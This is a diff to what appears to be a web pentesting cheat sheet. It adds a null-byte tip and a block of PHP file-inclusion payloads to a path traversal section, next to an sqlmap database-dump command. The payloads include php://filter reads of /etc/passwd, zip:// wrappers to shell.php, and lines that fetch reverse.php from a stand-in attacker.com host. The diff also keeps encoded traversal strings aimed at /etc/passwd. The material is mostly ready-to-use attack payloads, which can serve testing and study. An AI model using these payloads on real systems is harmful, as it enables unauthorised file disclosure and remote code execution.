@@ -223,8 +223,9 @@ sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --l
 > It may be possible to access arbitrary files and directories including application source code or configuration and critical system files.
 
 ### Pattern
+> Try to add `%00` at the end of your payload.
+
 ```
-︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
 ..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 %252e%252e%252e%252e%252e%252fetc%252fpasswd%00
@@ -245,6 +246,17 @@ sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --l
 
 - [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
 - [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
+### PHP pattern
+```
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=http://attacker.com/reverse.php
+php://filter/resource=/etc/passwd
+zip://path/to/file.zip%23shell.php
+http://attacker.com/reverse.php%00
+```
+
+- [PHP LFI](https://ruuand.github.io/Local_File_Include/)
 
 # SSTI
 > Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection.
